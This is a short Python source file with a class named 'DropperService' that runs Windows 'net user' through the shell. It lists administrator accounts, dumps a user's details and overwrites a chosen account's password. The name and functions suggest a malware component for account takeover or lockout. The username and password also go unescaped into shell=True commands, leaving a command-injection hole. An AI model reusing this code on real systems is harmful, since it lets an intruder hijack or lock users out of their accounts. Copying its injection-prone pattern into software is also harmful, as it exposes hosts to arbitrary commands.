from subprocess import check_output


class DropperService:
    @staticmethod
    def get_all_users() -> list:
        info = check_output("chcp 861 && net user", shell=True).decode('cp1252')

        users = []

        for raw in info.split("\n"):
            if "administrator" in raw.lower():
                users.append(raw.strip().split())

        return users

    @staticmethod
    def get_current_user_info(username: str) -> list:
        info = check_output(f"chcp 861 && net user {username}", shell=True).decode('cp1252')

        users = []

        for raw in info.split("\n"):
            if not raw or "membership" in raw.lower():
                continue

            users.append(raw.strip().split())

        return users

    @staticmethod
    def refresh_current_user_password(username: str, new_password: str) -> None:
        info = check_output(f"chcp 861 && net user {username} {new_password}", shell=True).decode('cp1252')

        for raw in info.split("\n"):
            if not raw or "membership" in raw.lower():
                continue

            print(raw.strip().split())
